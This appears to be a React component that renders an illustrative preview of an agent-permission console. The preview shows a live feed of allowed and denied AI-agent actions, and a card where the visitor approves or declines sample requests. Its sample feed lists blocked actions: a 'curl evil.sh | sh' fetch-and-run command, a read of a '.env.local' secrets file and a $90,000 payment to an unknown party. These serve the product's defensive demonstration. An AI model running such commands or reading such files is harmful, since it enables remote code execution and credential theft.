import {useEffect, useRef, useState} from 'react';
import {Bot, Inbox, LayoutDashboard, ScrollText, Check, X} from 'lucide-react';

const FEED = [
  ['allow', 'read_file', 'repo/src/billing.ts'], ['allow', 'web.search', '“seed benchmarks”'], ['deny', 'read_file', 'repo/.env.local'],
  ['allow', 'git.commit', 'feat/webhooks'], ['deny', 'shell.run', 'curl evil.sh | sh'], ['allow', 'db.query', 'analytics.events'],
  ['allow', 'invoices.read', 'inv-2291'], ['deny', 'payments.send', '$90,000 → unknown-llc'],
];
const ASKS = [
  {agent: 'research-bot', action: 'files.write', resource: 'workspace/out/summary.md', note: 'Summarising the README for the weekly report'},
  {agent: 'ops-agent', action: 'payments.send', resource: 'acme-corp · $420', note: 'March invoice, matches PO-1182'},
  {agent: 'support-agent', action: 'reply.send', resource: 'ticket T-4481', note: 'Refund confirmation drafted for review'},
];
const LABEL = {allow: 'Allowed', deny: 'Denied', ask: 'Needs approval', approved: 'Approved', declined: 'Declined'};

/** An interactive, clearly illustrative preview of the console. Approve or decline the request. */
export default function ProductWindow() {
  const [rows, setRows] = useState(() => FEED.slice(0, 5).map((r, i) => ({id: i, kind: r[0], action: r[1], resource: r[2], age: i * 3 + 2})));
  const [ask, setAsk] = useState(0);
  const [pending, setPending] = useState(true);
  const [counts, setCounts] = useState({allowed: 1284, blocked: 97});
  const n = useRef(5);
  const visible = useRef(false);
  const ref = useRef(null);

  useEffect(() => {
    const io = new IntersectionObserver(([e]) => { visible.current = e.isIntersecting; }, {threshold: 0.2});
    io.observe(ref.current);
    const t = setInterval(() => {
      if (!visible.current) return;
      const [kind, action, resource] = FEED[n.current % FEED.length];
      setRows(r => [{id: n.current, kind, action, resource, age: 0}, ...r.map(x => ({...x, age: x.age + 2}))].slice(0, 6));
      setCounts(c => (kind === 'allow' ? {...c, allowed: c.allowed + 1} : {...c, blocked: c.blocked + 1}));
      n.current++;
    }, 1900);
    return () => { clearInterval(t); io.disconnect(); };
  }, []);

  function decide(approve) {
    const a = ASKS[ask];
    setPending(false);
    setRows(r => [{id: 'd' + n.current++, kind: approve ? 'approved' : 'declined', action: a.action, resource: a.resource, age: 0}, ...r].slice(0, 6));
    setTimeout(() => { setAsk(i => (i + 1) % ASKS.length); setPending(true); }, 2600);
  }
  const a = ASKS[ask];

  return (
    <div className="pw" ref={ref}>
      <div className="pw-bar"><i /><i /><i /><span>shuin · console</span><em>Illustrative, interactive</em></div>
      <div className="pw-body">
        <aside>
          <b className="pw-logo"><svg width="18" height="18" viewBox="0 0 32 32"><circle cx="16" cy="16" r="11" fill="none" stroke="currentColor" strokeWidth="3.4" /><circle cx="16" cy="16" r="3.4" fill="var(--allow-glow)" /></svg> Shuin</b>
          <span><LayoutDashboard size={15} /> Overview</span><span><Bot size={15} /> Agents</span>
          <span className="on"><Inbox size={15} /> Approvals {pending && <u>1</u>}</span><span><ScrollText size={15} /> Audit log</span>
        </aside>
        <main>
          <div className="pw-stats">
            <div><small>Active agents</small><b>3</b></div>
            <div><small>Allowed</small><b>{counts.allowed.toLocaleString()}</b></div>
            <div><small>Blocked</small><b className="deny">{counts.blocked}</b></div>
          </div>
          <div className="pw-grid">
            <section className={`pw-ask ${pending ? '' : 'done'}`} aria-live="polite">
              {pending ? (
                <>
                  <span className="badge ask">Needs approval</span>
                  <h4>{a.agent} wants to <code>{a.action}</code></h4>
                  <p className="mono">{a.resource}</p>
                  <p className="say">“{a.note}”</p>
                  <div className="pw-actions"><button className="btn good sm" onClick={() => decide(true)}><Check size={14} /> Approve once</button><button className="btn ghost sm" onClick={() => decide(false)}><X size={14} /> Decline</button></div>
                </>
              ) : <p className="pw-clear"><Check size={16} /> Answered. The agent continues.</p>}
            </section>
            <section className="pw-feed">
              <small className="label">Live activity</small>
              <ul>
                {rows.map(r => (
                  <li key={r.id} className={r.kind}><span className={`badge ${r.kind === 'approved' || r.kind === 'allow' ? 'allow' : r.kind === 'ask' ? 'ask' : 'deny'}`}>{LABEL[r.kind]}</span><code>{r.action}</code><em>{r.resource}</em><time>{r.age ? `${r.age}s` : 'now'}</time></li>
                ))}
              </ul>
            </section>
          </div>
        </main>
      </div>
    </div>
  );
}
